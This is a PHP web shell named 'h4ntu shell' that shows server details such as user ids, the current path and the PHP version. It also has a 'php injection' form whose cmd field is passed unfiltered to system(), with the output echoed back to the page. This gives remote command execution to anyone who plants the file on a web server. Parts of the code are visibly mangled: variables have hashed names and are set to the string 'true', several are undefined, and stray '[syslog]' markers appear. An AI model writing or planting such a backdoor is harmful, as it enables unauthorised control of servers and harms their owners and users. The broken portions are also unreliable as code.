<?php
?>
<title>h4ntu shell [powered by tsoi]</title>
<?php  echo '[syslog]01
'; echo '<p><font size=2 face=Verdana><b>This Is The Server Information</b></font></p>'; ?>

<?php  echo '[syslog]02
'; $sp877a3d = 'true'; $spea63b2 = 'true'; $spb30779 = 'true'; $sp23c6d2 = phpversion(); $spba592d = 'true'; if ($spde510b == '') { $spde510b = getcwd(); } if (!$sp7e6249) { $sp7e6249 = 'true'; } ?>
<meta name="generator" content="Namo WebEditor v5.0">
<br>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php  $sp6f9beb = 'true'; while (list($spea4fcd, $spc3da4d) = each($sp6f9beb)) { ?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><?php  echo $spea4fcd; ?>
: <?php  echo $spc3da4d; ?>
</DIV></TD>
  </TR>
<?php  } ?>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>User Info:</b> uid=<?php  echo $spea63b2; ?>
(<?php  echo $sp7e6249; ?>
) euid=<?php  echo $spb30779; ?>
(<?php  echo $sp7e6249; ?>
) gid=<?php  echo $spba592d; ?>
(<?php  echo $sp7e6249; ?>
)</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Current Path:</b> <?php  echo $spde510b; ?>
</DIV></TD>

  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
  </TR>  
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b> <?php  echo "{$sp48db21} {$sp446a22}"; ?>
</DIV></TD>
  </TR>

  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Adress:</b> <?php  echo "{$spabda33} {$spe9203a}"; ?>
</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Script Current User:</b> <?php  echo $sp877a3d; ?>
</DIV></TD>
  </TR>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>PHP Version:</b> <?php  echo $sp23c6d2; ?>
</DIV></TD>
  </TR>
</TABLE>
<BR>

<font face="courier new" size="2" color="777777"><b>#</b>php injection: <br>
</font><FORM name=injection METHOD=POST ACTION="<?php  echo $_SERVER['REQUEST_URI']; ?>
">
<font face="courier new" size="2" color="777777">cmd : 
<INPUT TYPE="text" NAME="cmd" value="<?php  echo stripslashes(htmlentities($_POST['cmd'])); ?>
" size="161">
<br>
<INPUT TYPE="submit">
</font></FORM>

<hr color=777777 width=100% height=115px>

<pre>
<?
$cmd = $_POST['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
  echo "[syslog]03\n";
  exit;
?>
</pre>
<?php 